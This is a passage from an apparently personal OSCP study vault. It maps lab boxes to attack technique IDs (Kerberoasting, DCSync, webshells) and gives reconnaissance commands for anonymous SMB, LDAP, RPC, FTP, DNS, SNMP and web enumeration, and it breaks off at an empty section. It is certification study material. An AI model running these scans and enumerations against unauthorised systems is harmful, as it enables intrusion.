# Scenario Matrix

This is the complete fast-route index for the write-ups currently in the vault. Start with the box row, then follow its technique IDs. Every technique branch uses the same loop:

1. Run the smallest confirming command.
2. Compare the result with the example shape.
3. Select one What did you get? row.
4. Open the linked next stage and save the output.

Use variables from boxstart and boxset. Keep passwords, hashes, keys, cookies, and proof values in private loot only.

## Write-up coverage matrix

| Write-up | Fast route IDs |
|---|---|
| [[OSCP/BOXES/WRITE UPS/AD/Active\|Active]] | [[#T01 - Recon and service triage\|T01]] -> [[#T02 - Anonymous SMB, LDAP, and RPC enumeration\|T02]] -> [[#T35 - Group Policy Preferences credential recovery\|T35]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] -> [[#T34 - Kerberos AS-REP roasting and Kerberoasting\|T34]] -> [[#T45 - Password cracking and mechanical decoding\|T45]] |
| [[OSCP/BOXES/WRITE UPS/AD/Blackfield\|Blackfield]] | [[#T01 - Recon and service triage\|T01]] -> [[#T02 - Anonymous SMB, LDAP, and RPC enumeration\|T02]] -> [[#T34 - Kerberos AS-REP roasting and Kerberoasting\|T34]] -> [[#T45 - Password cracking and mechanical decoding\|T45]] -> [[#T36 - AD ACL, group membership, and ForceChangePassword\|T36]] -> [[#T33 - Windows credential artifacts, LSASS, Winlogon, and Credential Manager\|T33]] -> [[#T39 - NTDS, VSS, Backup Operators, and DCSync\|T39]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] |
| [[OSCP/BOXES/WRITE UPS/AD/Fermion\|Fermion]] | [[#T01 - Recon and service triage\|T01]] -> [[#T42 - Jenkins, Groovy, and build-log credential recovery\|T42]] -> [[#T18 - Source, configuration, backup, and log credential recovery\|T18]] -> [[#T23 - SSH credentials, keys, passphrases, and password reuse\|T23]] -> [[#T02 - Anonymous SMB, LDAP, and RPC enumeration\|T02]] -> [[#T31 - Windows services, tasks, AppLocker, and installer policy\|T31]] -> [[#T33 - Windows credential artifacts, LSASS, Winlogon, and Credential Manager\|T33]] -> [[#T39 - NTDS, VSS, Backup Operators, and DCSync\|T39]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] |
| [[OSCP/BOXES/WRITE UPS/AD/Flight\|Flight]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T14 - LFI, RFI, and path traversal\|T14]] -> [[#T40 - NTLM capture and LDAP passback\|T40]] -> [[#T02 - Anonymous SMB, LDAP, and RPC enumeration\|T02]] -> [[#T17 - File upload and webshell\|T17]] -> [[#T30 - Windows impersonation token abuse\|T30]] -> [[#T39 - NTDS, VSS, Backup Operators, and DCSync\|T39]] |
| [[OSCP/BOXES/WRITE UPS/AD/Forest\|Forest]] | [[#T01 - Recon and service triage\|T01]] -> [[#T02 - Anonymous SMB, LDAP, and RPC enumeration\|T02]] -> [[#T34 - Kerberos AS-REP roasting and Kerberoasting\|T34]] -> [[#T45 - Password cracking and mechanical decoding\|T45]] -> [[#T34 - Kerberos AS-REP roasting and Kerberoasting\|T34]] -> [[#T39 - NTDS, VSS, Backup Operators, and DCSync\|T39]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] |
| [[OSCP/BOXES/WRITE UPS/AD/Return\|Return]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T40 - NTLM capture and LDAP passback\|T40]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] -> [[#T31 - Windows services, tasks, AppLocker, and installer policy\|T31]] |
| [[OSCP/BOXES/WRITE UPS/AD/RockyColt\|RockyColt]] | [[#T01 - Recon and service triage\|T01]] -> [[#T02 - Anonymous SMB, LDAP, and RPC enumeration\|T02]] -> [[#T09 - Tomcat manager and WAR upload\|T09]] -> [[#T18 - Source, configuration, backup, and log credential recovery\|T18]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] -> [[#T36 - AD ACL, group membership, and ForceChangePassword\|T36]] -> [[#T38 - RBCD and delegated group abuse\|T38]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] |
| [[OSCP/BOXES/WRITE UPS/AD/Sauna\|Sauna]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T34 - Kerberos AS-REP roasting and Kerberoasting\|T34]] -> [[#T45 - Password cracking and mechanical decoding\|T45]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] -> [[#T33 - Windows credential artifacts, LSASS, Winlogon, and Credential Manager\|T33]] -> [[#T39 - NTDS, VSS, Backup Operators, and DCSync\|T39]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] |
| [[OSCP/BOXES/WRITE UPS/AD/Vintage\|Vintage]] | [[#T01 - Recon and service triage\|T01]] -> [[#T02 - Anonymous SMB, LDAP, and RPC enumeration\|T02]] -> [[#T34 - Kerberos AS-REP roasting and Kerberoasting\|T34]] -> [[#T37 - gMSA password read\|T37]] -> [[#T36 - AD ACL, group membership, and ForceChangePassword\|T36]] -> [[#T38 - RBCD and delegated group abuse\|T38]] -> [[#T33 - Windows credential artifacts, LSASS, Winlogon, and Credential Manager\|T33]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] |
| [[OSCP/BOXES/WRITE UPS/AD/Search\|Search]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T34 - Kerberos AS-REP roasting and Kerberoasting\|T34]] -> [[#T45 - Password cracking and mechanical decoding\|T45]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] -> [[#T18 - Source, configuration, backup, and log credential recovery\|T18]] -> [[#T45 - Password cracking and mechanical decoding\|T45]] -> [[#T50 - Client certificate and PowerShell Web Access\|T50]] -> [[#T37 - gMSA password read\|T37]] -> [[#T36 - AD ACL, group membership, and ForceChangePassword\|T36]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] |
| [[OSCP/BOXES/WRITE UPS/Linux/Bashed\|Bashed]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T20 - Interpreter, header backdoor, and exposed webshell\|T20]] -> [[#T22 - Callback and shell stabilization\|T22]] -> [[#T25 - Linux sudo interpreter and editor abuse\|T25]] -> [[#T27 - Linux cron, systemd, and scheduled-file abuse\|T27]] -> [[#T26 - Linux SUID, capabilities, and privileged binary\|T26]] |
| [[OSCP/BOXES/WRITE UPS/Linux/Blocky\|Blocky]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T08 - CMS, WordPress, Monstra, Magento, or plugin branch\|T08]] -> [[#T19 - JAR, PE, and custom binary analysis\|T19]] -> [[#T18 - Source, configuration, backup, and log credential recovery\|T18]] -> [[#T23 - SSH credentials, keys, passphrases, and password reuse\|T23]] -> [[#T25 - Linux sudo interpreter and editor abuse\|T25]] |
| [[OSCP/BOXES/WRITE UPS/Linux/Bratarina\|Bratarina]] | [[#T01 - Recon and service triage\|T01]] -> [[#T43 - SMTP, OpenSMTPD, and service-specific RCE\|T43]] -> [[#T21 - Buffer overflow and custom protocol exploit\|T21]] -> [[#T22 - Callback and shell stabilization\|T22]] |
| [[OSCP/BOXES/WRITE UPS/Linux/Cockpit\|Cockpit]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T12 - SQL injection and database extraction\|T12]] -> [[#T18 - Source, configuration, backup, and log credential recovery\|T18]] -> [[#T11 - Management interface and default credential branch\|T11]] -> [[#T23 - SSH credentials, keys, passphrases, and password reuse\|T23]] -> [[#T25 - Linux sudo interpreter and editor abuse\|T25]] |
| [[OSCP/BOXES/WRITE UPS/Linux/Covfefe\|Covfefe]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T18 - Source, configuration, backup, and log credential recovery\|T18]] -> [[#T23 - SSH credentials, keys, passphrases, and password reuse\|T23]] -> [[#T19 - JAR, PE, and custom binary analysis\|T19]] -> [[#T26 - Linux SUID, capabilities, and privileged binary\|T26]] -> [[#T21 - Buffer overflow and custom protocol exploit\|T21]] |
| [[OSCP/BOXES/WRITE UPS/Linux/CronOS\|CronOS]] | [[#T01 - Recon and service triage\|T01]] -> [[#T04 - DNS zone transfer and virtual hosts\|T04]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T12 - SQL injection and database extraction\|T12]] -> [[#T13 - Command injection\|T13]] -> [[#T22 - Callback and shell stabilization\|T22]] -> [[#T27 - Linux cron, systemd, and scheduled-file abuse\|T27]] |
| [[OSCP/BOXES/WRITE UPS/Linux/Dawn2\|Dawn2]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T19 - JAR, PE, and custom binary analysis\|T19]] -> [[#T21 - Buffer overflow and custom protocol exploit\|T21]] -> [[#T22 - Callback and shell stabilization\|T22]] -> [[#T21 - Buffer overflow and custom protocol exploit\|T21]] |
| [[OSCP/BOXES/WRITE UPS/Linux/DevOops\|DevOops]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T15 - XXE file read\|T15]] -> [[#T18 - Source, configuration, backup, and log credential recovery\|T18]] -> [[#T48 - Unsafe deserialization and Python pickle\|T48]] -> [[#T23 - SSH credentials, keys, passphrases, and password reuse\|T23]] -> [[#T18 - Source, configuration, backup, and log credential recovery\|T18]] |
| [[OSCP/BOXES/WRITE UPS/Linux/Jarvis\|Jarvis]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T12 - SQL injection and database extraction\|T12]] -> [[#T13 - Command injection\|T13]] -> [[#T22 - Callback and shell stabilization\|T22]] -> [[#T26 - Linux SUID, capabilities, and privileged binary\|T26]] -> [[#T25 - Linux sudo interpreter and editor abuse\|T25]] |
| [[OSCP/BOXES/WRITE UPS/Linux/Knife\|Knife]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T20 - Interpreter, header backdoor, and exposed webshell\|T20]] -> [[#T22 - Callback and shell stabilization\|T22]] -> [[#T25 - Linux sudo interpreter and editor abuse\|T25]] |
| [[OSCP/BOXES/WRITE UPS/Linux/Mirai\|Mirai]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T44 - IoT, Pi-hole, SNMP process, and default credentials\|T44]] -> [[#T23 - SSH credentials, keys, passphrases, and password reuse\|T23]] -> [[#T25 - Linux sudo interpreter and editor abuse\|T25]] |
| [[OSCP/BOXES/WRITE UPS/Linux/Networked\|Networked]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T18 - Source, configuration, backup, and log credential recovery\|T18]] -> [[#T17 - File upload and webshell\|T17]] -> [[#T22 - Callback and shell stabilization\|T22]] -> [[#T27 - Linux cron, systemd, and scheduled-file abuse\|T27]] -> [[#T25 - Linux sudo interpreter and editor abuse\|T25]] |
| [[OSCP/BOXES/WRITE UPS/Linux/Nibbles\|Nibbles]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T08 - CMS, WordPress, Monstra, Magento, or plugin branch\|T08]] -> [[#T17 - File upload and webshell\|T17]] -> [[#T23 - SSH credentials, keys, passphrases, and password reuse\|T23]] -> [[#T25 - Linux sudo interpreter and editor abuse\|T25]] |
| [[OSCP/BOXES/WRITE UPS/Linux/Nukem\|Nukem]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T08 - CMS, WordPress, Monstra, Magento, or plugin branch\|T08]] -> [[#T17 - File upload and webshell\|T17]] -> [[#T26 - Linux SUID, capabilities, and privileged binary\|T26]] -> [[#T25 - Linux sudo interpreter and editor abuse\|T25]] |
| [[OSCP/BOXES/WRITE UPS/Linux/OpenAdmin\|OpenAdmin]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T07 - Version-specific web exploit\|T07]] -> [[#T18 - Source, configuration, backup, and log credential recovery\|T18]] -> [[#T23 - SSH credentials, keys, passphrases, and password reuse\|T23]] -> [[#T28 - Local services, port forwarding, and tmux or VNC\|T28]] -> [[#T18 - Source, configuration, backup, and log credential recovery\|T18]] -> [[#T25 - Linux sudo interpreter and editor abuse\|T25]] |
| [[OSCP/BOXES/WRITE UPS/Linux/Payday\|Payday]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T14 - LFI, RFI, and path traversal\|T14]] -> [[#T45 - Password cracking and mechanical decoding\|T45]] -> [[#T23 - SSH credentials, keys, passphrases, and password reuse\|T23]] -> [[#T25 - Linux sudo interpreter and editor abuse\|T25]] |
| [[OSCP/BOXES/WRITE UPS/Linux/Pebbles\|Pebbles]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T12 - SQL injection and database extraction\|T12]] -> [[#T18 - Source, configuration, backup, and log credential recovery\|T18]] -> [[#T26 - Linux SUID, capabilities, and privileged binary\|T26]] -> [[#T25 - Linux sudo interpreter and editor abuse\|T25]] |
| [[OSCP/BOXES/WRITE UPS/Linux/Pelican\|Pelican]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T13 - Command injection\|T13]] -> [[#T22 - Callback and shell stabilization\|T22]] -> [[#T25 - Linux sudo interpreter and editor abuse\|T25]] |
| [[OSCP/BOXES/WRITE UPS/Linux/Poison\|Poison]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T14 - LFI, RFI, and path traversal\|T14]] -> [[#T45 - Password cracking and mechanical decoding\|T45]] -> [[#T23 - SSH credentials, keys, passphrases, and password reuse\|T23]] -> [[#T28 - Local services, port forwarding, and tmux or VNC\|T28]] |
| [[OSCP/BOXES/WRITE UPS/Linux/Sea\|Sea]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T46 - Stored XSS and administrator-bot workflow\|T46]] -> [[#T17 - File upload and webshell\|T17]] -> [[#T45 - Password cracking and mechanical decoding\|T45]] -> [[#T23 - SSH credentials, keys, passphrases, and password reuse\|T23]] -> [[#T13 - Command injection\|T13]] -> [[#T27 - Linux cron, systemd, and scheduled-file abuse\|T27]] |
| [[OSCP/BOXES/WRITE UPS/Linux/Snookums\|Snookums]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T14 - LFI, RFI, and path traversal\|T14]] -> [[#T13 - Command injection\|T13]] -> [[#T18 - Source, configuration, backup, and log credential recovery\|T18]] -> [[#T23 - SSH credentials, keys, passphrases, and password reuse\|T23]] -> [[#T25 - Linux sudo interpreter and editor abuse\|T25]] |
| [[OSCP/BOXES/WRITE UPS/Linux/SolidState\|SolidState]] | [[#T01 - Recon and service triage\|T01]] -> [[#T10 - Mail service default credentials and mailbox pivot\|T10]] -> [[#T18 - Source, configuration, backup, and log credential recovery\|T18]] -> [[#T23 - SSH credentials, keys, passphrases, and password reuse\|T23]] -> [[#T24 - Restricted shell\|T24]] -> [[#T27 - Linux cron, systemd, and scheduled-file abuse\|T27]] -> [[#T22 - Callback and shell stabilization\|T22]] |
| [[OSCP/BOXES/WRITE UPS/Linux/SwagShop\|SwagShop]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T08 - CMS, WordPress, Monstra, Magento, or plugin branch\|T08]] -> [[#T12 - SQL injection and database extraction\|T12]] -> [[#T13 - Command injection\|T13]] -> [[#T25 - Linux sudo interpreter and editor abuse\|T25]] |
| [[OSCP/BOXES/WRITE UPS/Linux/TartarSauce\|TartarSauce]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T08 - CMS, WordPress, Monstra, Magento, or plugin branch\|T08]] -> [[#T14 - LFI, RFI, and path traversal\|T14]] -> [[#T18 - Source, configuration, backup, and log credential recovery\|T18]] -> [[#T27 - Linux cron, systemd, and scheduled-file abuse\|T27]] |
| [[OSCP/BOXES/WRITE UPS/Linux/Traceback\|Traceback]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T20 - Interpreter, header backdoor, and exposed webshell\|T20]] -> [[#T22 - Callback and shell stabilization\|T22]] -> [[#T25 - Linux sudo interpreter and editor abuse\|T25]] -> [[#T27 - Linux cron, systemd, and scheduled-file abuse\|T27]] -> [[#T26 - Linux SUID, capabilities, and privileged binary\|T26]] |
| [[OSCP/BOXES/WRITE UPS/Linux/Traverxec\|Traverxec]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T07 - Version-specific web exploit\|T07]] -> [[#T18 - Source, configuration, backup, and log credential recovery\|T18]] -> [[#T23 - SSH credentials, keys, passphrases, and password reuse\|T23]] -> [[#T25 - Linux sudo interpreter and editor abuse\|T25]] |
| [[OSCP/BOXES/WRITE UPS/Linux/Valentine\|Valentine]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T47 - TLS memory disclosure and Heartbleed\|T47]] -> [[#T23 - SSH credentials, keys, passphrases, and password reuse\|T23]] -> [[#T28 - Local services, port forwarding, and tmux or VNC\|T28]] -> [[#T45 - Password cracking and mechanical decoding\|T45]] |
| [[OSCP/BOXES/WRITE UPS/Linux/Zenphoto\|Zenphoto]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T07 - Version-specific web exploit\|T07]] -> [[#T29 - Linux kernel or legacy local exploit\|T29]] |
| [[OSCP/BOXES/WRITE UPS/Linux/clamAV\|clamAV]] | [[#T01 - Recon and service triage\|T01]] -> [[#T05 - SNMP, IKE, and IPSec transport gate\|T05]] -> [[#T44 - IoT, Pi-hole, SNMP process, and default credentials\|T44]] -> [[#T43 - SMTP, OpenSMTPD, and service-specific RCE\|T43]] -> [[#T22 - Callback and shell stabilization\|T22]] |
| [[OSCP/BOXES/WRITE UPS/Windows/Bastard\|Bastard]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T07 - Version-specific web exploit\|T07]] -> [[#T22 - Callback and shell stabilization\|T22]] -> [[#T30 - Windows impersonation token abuse\|T30]] |
| [[OSCP/BOXES/WRITE UPS/Windows/Buff\|Buff]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T17 - File upload and webshell\|T17]] -> [[#T22 - Callback and shell stabilization\|T22]] -> [[#T28 - Local services, port forwarding, and tmux or VNC\|T28]] -> [[#T21 - Buffer overflow and custom protocol exploit\|T21]] |
| [[OSCP/BOXES/WRITE UPS/Windows/Chatterbox\|Chatterbox]] | [[#T01 - Recon and service triage\|T01]] -> [[#T21 - Buffer overflow and custom protocol exploit\|T21]] -> [[#T22 - Callback and shell stabilization\|T22]] -> [[#T32 - Windows ACL and file-permission abuse\|T32]] |
| [[OSCP/BOXES/WRITE UPS/Windows/Conceal\|Conceal]] | [[#T01 - Recon and service triage\|T01]] -> [[#T05 - SNMP, IKE, and IPSec transport gate\|T05]] -> [[#T03 - Anonymous FTP and filesystem exposure\|T03]] -> [[#T17 - File upload and webshell\|T17]] -> [[#T22 - Callback and shell stabilization\|T22]] -> [[#T30 - Windows impersonation token abuse\|T30]] |
| [[OSCP/BOXES/WRITE UPS/Windows/Devel\|Devel]] | [[#T01 - Recon and service triage\|T01]] -> [[#T03 - Anonymous FTP and filesystem exposure\|T03]] -> [[#T17 - File upload and webshell\|T17]] -> [[#T22 - Callback and shell stabilization\|T22]] -> [[#T30 - Windows impersonation token abuse\|T30]] |
| [[OSCP/BOXES/WRITE UPS/Windows/Jerry\|Jerry]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T09 - Tomcat manager and WAR upload\|T09]] -> [[#T17 - File upload and webshell\|T17]] -> [[#T22 - Callback and shell stabilization\|T22]] |
| [[OSCP/BOXES/WRITE UPS/Windows/Love\|Love]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T16 - SSRF to an internal service\|T16]] -> [[#T17 - File upload and webshell\|T17]] -> [[#T13 - Command injection\|T13]] -> [[#T31 - Windows services, tasks, AppLocker, and installer policy\|T31]] |
| [[OSCP/BOXES/WRITE UPS/Windows/MarkUp\|MarkUp]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T15 - XXE file read\|T15]] -> [[#T23 - SSH credentials, keys, passphrases, and password reuse\|T23]] -> [[#T31 - Windows services, tasks, AppLocker, and installer policy\|T31]] |
| [[OSCP/BOXES/WRITE UPS/Windows/Optimum\|Optimum]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T07 - Version-specific web exploit\|T07]] -> [[#T13 - Command injection\|T13]] -> [[#T22 - Callback and shell stabilization\|T22]] -> [[#T52 - Windows patch triage and MS16-098\|T52]] -> [[#T49 - Cleanup and closeout after a scenario branch\|T49]] |
| [[OSCP/BOXES/WRITE UPS/Windows/Netmon\|Netmon]] | [[#T01 - Recon and service triage\|T01]] -> [[#T03 - Anonymous FTP and filesystem exposure\|T03]] -> [[#T18 - Source, configuration, backup, and log credential recovery\|T18]] -> [[#T11 - Management interface and default credential branch\|T11]] -> [[#T13 - Command injection\|T13]] -> [[#T31 - Windows services, tasks, AppLocker, and installer policy\|T31]] |
| [[OSCP/BOXES/WRITE UPS/Windows/Servmon\|Servmon]] | [[#T01 - Recon and service triage\|T01]] -> [[#T03 - Anonymous FTP and filesystem exposure\|T03]] -> [[#T14 - LFI, RFI, and path traversal\|T14]] -> [[#T23 - SSH credentials, keys, passphrases, and password reuse\|T23]] -> [[#T28 - Local services, port forwarding, and tmux or VNC\|T28]] -> [[#T31 - Windows services, tasks, AppLocker, and installer policy\|T31]] |

## Technique branches

## T01 - Recon and service triage

### Run this

~~~bash
rustscan -a "$BoxIP" --ulimit 5000 -- -Pn -n -sC -sV -oA "$BoxDir/nmap/rustscan"
sudo nmap -Pn -n -sS -p- --min-rate 5000 "$BoxIP" -oA "$BoxDir/nmap/allports"
sudo nmap -Pn -n -sU --top-ports 100 "$BoxIP" -oA "$BoxDir/nmap/udp-top100"
~~~

### What did you get?

- [ ] HTTP or HTTPS -> **Open [[OSCP/EXAM RUNBOOK/02 - Web and Services|Web and Services]] and [[#T06 - Web fingerprint and content discovery|T06]].**
- [ ] SSH or Linux service set -> **Open [[OSCP/EXAM RUNBOOK/03 - Linux Fast Path|Linux Fast Path]].**
- [ ] SMB, RPC, RDP, or WinRM -> **Open [[OSCP/EXAM RUNBOOK/04 - Windows Fast Path|Windows Fast Path]].**
- [ ] Kerberos, LDAP, Global Catalog, or supplied domain credentials -> **Open [[OSCP/EXAM RUNBOOK/05 - Active Directory Fast Path|Active Directory Fast Path]].**
- [ ] UDP 161 or UDP 500 -> **Open [[#T05 - SNMP, IKE, and IPSec transport gate|T05]].**
- [ ] FTP, DNS, SMTP, or an unusual application port -> **Open [[#T03 - Anonymous FTP and filesystem exposure|T03]], [[#T04 - DNS zone transfer and virtual hosts|T04]], [[#T43 - SMTP, OpenSMTPD, and service-specific RCE|T43]], or the matching application branch.**

### Open next

Set $OpenPorts, $WebPort, $Domain, $FQDN, and $DCIP only from the saved scan. Continue to [[#T02 - Anonymous SMB, LDAP, and RPC enumeration|T02]], [[#T03 - Anonymous FTP and filesystem exposure|T03]], [[#T04 - DNS zone transfer and virtual hosts|T04]], [[#T05 - SNMP, IKE, and IPSec transport gate|T05]], or [[#T06 - Web fingerprint and content discovery|T06]].

## T02 - Anonymous SMB, LDAP, and RPC enumeration

### Run this

~~~bash
smbclient -N -L "//$BoxIP"
netexec smb "$BoxIP" -u '' -p '' --shares
ldapsearch -x -H "ldap://$BoxIP" -s base namingcontexts defaultNamingContext
rpcclient -U '' -N "$BoxIP" -c 'enumdomusers;netshareenumall'
~~~

### What did you get?

- [ ] A readable share or profile list -> **Download only the relevant files and open [[#T18 - Source, configuration, backup, and log credential recovery|T18]] or [[#T35 - Group Policy Preferences credential recovery|T35]].**
- [ ] Domain naming context or usernames -> **Open [[#T34 - Kerberos AS-REP roasting and Kerberoasting|T34]] and validate one account at a time.**
- [ ] Anonymous access is denied -> **Keep the negative result, then open [[#T06 - Web fingerprint and content discovery|T06]] or [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation|T41]] with known credentials.**
- [ ] A writable share or web-root mapping -> **Open [[#T17 - File upload and webshell|T17]].**

### Open next

Use [[OSCP/RUNBOOK V2/Windows - SMB Enum|Windows SMB Enumeration]] for the exact share operation, then return here with the discovered object, file, or username.

## T03 - Anonymous FTP and filesystem exposure

### Run this

~~~bash
curl -sS "ftp://$BoxIP/" | tee "$BoxDir/loot/ftp-root.txt"
curl -sS "ftp://$BoxIP/$RemotePath" -o "$BoxDir/loot/$Filename"
~~~

### What did you get?

- [ ] Anonymous listing or download succeeds -> **Inspect configuration, user directories, backups, and web-root paths. Open [[#T18 - Source, configuration, backup, and log credential recovery|T18]] or [[#T17 - File upload and webshell|T17]].**
- [ ] Anonymous upload succeeds -> **Place only the controlled file needed for the web branch, then open [[#T17 - File upload and webshell|T17]].**
- [ ] 550 on a known path -> **Treat it as an access-control result, not proof the file is absent. Open [[#T14 - LFI, RFI, and path traversal|T14]] if another service can read it.**
- [ ] No anonymous access -> **Return to [[#T01 - Recon and service triage|T01]] and continue with the confirmed services.**

### Open next

For the Windows filesystem pattern, use [[OSCP/RUNBOOK V2/Windows - FTP Enumeration|Windows FTP Enumeration]]. For Linux FTP, inspect source and credentials with [[#T18 - Source, configuration, backup, and log credential recovery|T18]].

## T04 - DNS zone transfer and virtual hosts

### Run this

~~~bash
dig axfr "$Domain" @"$DCIP" | tee "$BoxDir/loot/axfr.txt"
ffuf -u "http://$BoxIP:$WebPort/" -H "Host: FUZZ.$Domain" -w "$Wordlist" -fs "$BaselineSize" -of json -o "$BoxDir/loot/vhosts.json"
~~~

### What did you get?

- [ ] Zone records or a new hostname -> **Set $FQDN, add the mapping, and repeat [[#T06 - Web fingerprint and content discovery|T06]] against the new host.**
- [ ] A different virtual host returns a different response -> **Open [[#T06 - Web fingerprint and content discovery|T06]] and preserve the baseline comparison.**
- [ ] Transfer refused and no vhost difference -> **Return to [[#T01 - Recon and service triage|T01]] or [[#T06 - Web fingerprint and content discovery|T06]]; do not brute force DNS blindly.**

### Open next

Open [[OSCP/RUNBOOK V2/Port Triage|RUNBOOK V2 Port Triage]] when the record set needs interpretation, then return to [[#T06 - Web fingerprint and content discovery|T06]].

## T05 - SNMP, IKE, and IPSec transport gate

### Run this

~~~bash
snmpwalk -v2c -c "$Community" "$BoxIP" | tee "$BoxDir/loot/snmp.txt"
ike-scan -M "$BoxIP" | tee "$BoxDir/loot/ike-scan.txt"
~~~

### What did you get?

- [ ] SNMP discloses a credential, PSK, hostname, or process -> **Save it privately, validate it once, then open the matching credential or IKE branch.**
- [ ] IKE proposal responds -> **Open [[OSCP/RUNBOOK V2/Windows - IKE-IPSec Transport|IKE-IPSec Transport]], establish the policy, and repeat [[#T01 - Recon and service triage|T01]].**
- [ ] Both are silent -> **Confirm the interface, community, and UDP scan before changing the VPN.**

### Open next

Use [[OSCP/RUNBOOK V2/Linux - SNMP Enum|SNMP Enumeration]] for the walk and [[OSCP/RUNBOOK V2/Windows - IKE-IPSec Transport|IKE-IPSec Transport]] for the policy. Do not treat filtered TCP as the final surface.

## T06 - Web fingerprint and content discovery

### Run this

~~~bash
boxset WebURL "http://$BoxIP:$WebPort"
httpx-toolkit -u "$WebURL" -sc -title -tech-detect -server -o "$BoxDir/loot/httpx.txt"
curl -sS -i --max-time 30 "$WebURL/" | tee "$BoxDir/loot/http-root.txt"
feroxbuster -u "$WebURL/" -w "$Wordlist" -x php,txt,html,bak,old,zip -t 30 -o "$BoxDir/loot/ferox.txt"
~~~

### What did you get?

- [ ] CMS or known framework -> **Open [[#T07 - Version-specific web exploit|T07]] or [[#T08 - CMS, WordPress, Monstra, Magento, or plugin branch|T08]].**
- [ ] Login, API, or unusual method -> **Start Burp, capture the request, and replay one change at a time.**
- [ ] Upload -> **Open [[#T17 - File upload and webshell|T17]].**
- [ ] File parameter or XML input -> **Open [[#T14 - LFI, RFI, and path traversal|T14]] or [[#T15 - XXE file read|T15]].**
- [ ] Source archive, backup, JAR, or configuration -> **Open [[#T18 - Source, configuration, backup, and log credential recovery|T18]] or [[#T19 - JAR, PE, and custom binary analysis|T19]].**
- [ ] Slow dynamic endpoint -> **Measure a static path, lower concurrency, and continue manually.**
- [ ] No useful path -> **Open [[#T04 - DNS zone transfer and virtual hosts|T04]] for vhosts, then [[#T07 - Version-specific web exploit|T07]] for version-specific search.**

### Open next

Use [[OSCP/EXAM RUNBOOK/02 - Web and Services|Web and Services]] for the fast web loop and [[05_BURP_SUITE_COMPLETE_GUIDE/05_BURP_SUITE_COMPLETE_GUIDE|Burp Suite guide]] for request capture.

## T07 - Version-specific web exploit

### Run this

~~~bash
